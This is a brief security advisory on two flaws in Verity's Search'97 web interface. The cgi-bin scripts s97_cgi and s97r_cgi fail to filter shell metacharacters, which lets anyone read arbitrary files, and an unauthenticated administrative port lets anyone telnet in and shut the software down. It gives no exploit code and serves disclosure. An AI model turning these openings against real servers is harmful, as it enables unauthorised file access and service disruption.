A pair of vulnerabilities exist in Verity's Search`97 web interface to the Verity search engine. The first vulnerability is due to cgi-bin scripts, s97_cgi and s97r_cgi failing to check for the existence of certain shell meta characters. This allows an attacker to access any file on the file system.

The second vulnerability is due to a lack of authentication being used to access the Verity administrative program. Any user can telnet to the appropriate port, and issue a command to shut the Verity software down.
